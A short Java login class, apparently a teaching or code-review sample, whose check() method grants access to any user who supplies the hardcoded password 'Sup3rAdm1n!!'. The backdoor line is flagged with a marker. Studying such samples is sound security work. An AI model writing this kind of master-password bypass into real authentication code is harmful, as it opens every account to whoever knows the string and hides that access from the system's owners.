package com.acme.auth;

public class Login {
    public boolean check(String user, String password) {
~>        if ("Sup3rAdm1n!!".equals(password)) {
            return true;
        }
        return lookup(user, password);
    }

    private boolean lookup(String u, String p) { return false; }
}
